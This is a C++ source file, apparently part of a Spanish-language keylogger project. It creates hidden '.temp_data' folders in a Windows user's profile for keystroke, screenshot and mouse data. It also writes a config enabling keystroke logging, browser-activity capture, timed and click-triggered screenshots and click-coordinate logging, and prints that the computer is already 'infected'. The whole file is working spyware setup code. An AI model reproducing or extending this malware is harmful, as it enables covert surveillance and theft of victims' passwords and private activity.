#include "Build.h"

Build::Build(std::string user) {
	directoryPath = "C:\\Users\\" + user + "\\.temp_data\\";
	directoryPathKeyboard = "C:\\Users\\" + user + "\\.temp_data\\keyboard";
	directoryPathImage = "C:\\Users\\" + user + "\\.temp_data\\image";
	directoryPathMouse = "C:\\Users\\" + user + "\\.temp_data\\mouse";
}

bool Build::existConfig() {
	std::ifstream file(getPath() + "\\.conf");
	return file.good();
}

void Build::CreateFileConfig(std::string user, std::string computer, std::string id, std::string date, std::string time) {
	if (Build::existConfig()) {
		std::cout << "Esta computadora ya esta infectada" << std::endl;
	}
	else {
		std::ofstream file(directoryPath + "\\.conf");
		if (!file) {
			std::cout << "Error al crear el archivo de informacion..." << std::endl;
		}
		else {
			file << "#CONFIGURACION DEL FUNCIONAMIENTO DEL KEYLOGGER" << std::endl;
			file << "#Informacion del usuario y computadora" << std::endl;
			file << "User = " << user << std::endl;
			file << "Computer = " << computer << std::endl;
			file << "ID = " << id << std::endl;
			file << "#Fecha y hora de inicio" << std::endl;
			file << "Date = " << date << std::endl;
			file << "Time = " << time << std::endl;
			file << "#Configuracion del sistema...." << std::endl;
			file << "#Capturar teclado" << std::endl;
			file << "KeyStroke = on" << std::endl;
			file << "#Capturar actividad en navegadores web" << std::endl;
			file << "Website = on" << std::endl;
			file << "#Capturar pantalla con la tecla Enter" << std::endl;
			file << "Screen_Enter = on" << std::endl;
			file << "#Capturar pantalla con el boton izquierdo del mouse" << std::endl;
			file << "Screen_Click = on" << std::endl;
			file << "#Capturar pantalla con un temporizador" << std::endl;
			file << "Screen_Time = on" << std::endl;
			file << "#Capturar pantalla con un temporizador, ingresar valor en segundos (60sec = 1min)" << std::endl;
			file << "Timer = 300" << std::endl;
			file << "#Generar archivos con las cordenadas de donde se realizaron los clicks" << std::endl;
			file << "Capture_Mouse = on" << std::endl;
			file.close();
		}
	}
}

std::string Build::getPath() {
	return directoryPath;
}
std::string Build::getPathKeyboard() {
	return directoryPathKeyboard;
}
std::string Build::getPathImage() {
	return directoryPathImage;
}
std::string Build::getPathMouse() {
	return directoryPathMouse;
}

void Build::CreateDirectorySpy() {
	if (!Build::Path())
	{
		fs::create_directory(directoryPath) ?
			std::cout << "created directory - " << directoryPath << std::endl :
			std::cout << "create_directory() failed" << std::endl;
	}
	if (!Build::Keyboard())
	{
		fs::create_directory(directoryPathKeyboard) ?
			std::cout << "created directory - " << directoryPathKeyboard << std::endl :
			std::cout << "create_directory() failed" << std::endl;
	}
	if (!Build::Image())
	{
		fs::create_directory(directoryPathImage) ?
			std::cout << "created directory - " << directoryPathImage << std::endl :
			std::cout << "create_directory() failed" << std::endl;
	}
	if (!Build::Mouse())
	{
		fs::create_directory(directoryPathMouse) ?
			std::cout << "created directory - " << directoryPathMouse << std::endl :
			std::cout << "create_directory() failed" << std::endl;
	}

	std::cout << "Directorios preparados..." << std::endl;
}

bool Build::Path() {
	if (fs::is_directory(directoryPath)) {
		return true;
	}
	return false;
}

bool Build::Keyboard() {
	if (fs::is_directory(directoryPathKeyboard)) {
		return true;
	}
	return false;
}

bool Build::Image() {
	if (fs::is_directory(directoryPathImage)) {
		return true;
	}
	return false;
}

bool Build::Mouse() {
	if (fs::is_directory(directoryPathMouse)) {
		return true;
	}
	return false;
}
